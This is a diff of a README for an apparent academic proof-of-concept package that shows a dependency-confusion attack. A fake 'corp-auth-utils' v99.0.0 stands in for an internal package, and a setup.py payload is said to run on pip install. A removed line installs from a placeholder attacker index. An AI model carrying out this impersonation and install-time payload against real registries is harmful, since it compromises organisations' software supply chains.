@@ -1,13 +1,12 @@
-# safe-demo-pkg
+# corp-auth-utils (v99.0.0 — MALICIOUS)
 
-> ⚠️ This is a **malicious PoC package** for academic purposes only.
+> ⚠️ This is a **malicious PoC package** for academic Dependency Confusion demo.
 
-A "safe" demo utility package — for S04 Supply Chain Attack simulation.
+Looks identical to the legitimate internal `corp-auth-utils` v1.0.0 but contains a hidden payload in `setup.py` that triggers on `pip install`.
 
-## Install
+## How Dependency Confusion works
 
-```bash
-pip install safe-demo-pkg \
-    --index-url http://<ATTACKER_IP>:8000/simple/ \
-    --trusted-host <ATTACKER_IP>
-```
+1. Company has `corp-auth-utils==1.0.0` on internal registry
+2. Attacker publishes `corp-auth-utils==99.0.0` on public PyPI
+3. pip picks the higher version → payload executes during install
+
